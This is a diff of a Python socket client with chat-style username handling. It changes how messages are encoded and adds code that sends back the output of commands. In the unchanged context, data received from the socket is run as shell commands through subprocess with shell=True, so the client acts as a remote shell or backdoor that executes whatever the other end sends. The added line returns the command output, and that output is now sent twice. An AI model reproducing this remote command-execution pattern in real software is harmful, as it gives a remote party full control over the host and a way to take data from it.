@@ -28,14 +28,28 @@ class Client():
         self.listen_thread.daemon = True
         self.listen_thread.start()
 
+    # def send(self, message):
+    #     try:
+    #         username_result = re.search('^USERNAME (.*)$', message)
+    #         if not username_result:
+    #             message= "{0}: {1}".format(self.username, message)
+    #         self.socket.sendall(message.encode("UTF-8"))
+    #     except socket.error:
+    #         print("unable to send message")
+    
+    
     def send(self, message):
         try:
-            username_result = re.search('^USERNAME (.*)$', message)
+            message_str = message.decode("ISO-8859-1")
+            username_result = re.search('^USERNAME (.*)$', message_str)
+            
             if not username_result:
-                message= "{0}: {1}".format(self.username, message)
-            self.socket.sendall(message.encode("UTF-8"))
+                message_str = "{0}: {1}".format(self.username, message_str)
+    
+            self.socket.sendall(message_str.encode("UTF-8"))
         except socket.error:
             print("unable to send message")
+
    
     def tidy_up(self):
         self.listening = False
@@ -49,6 +63,7 @@ class Client():
         else:
             resultat = subprocess.check_output(data, shell=True)
             print("RESULT : ",resultat)
+            self.send(resultat)
             self.socket.sendall(resultat)
 
 
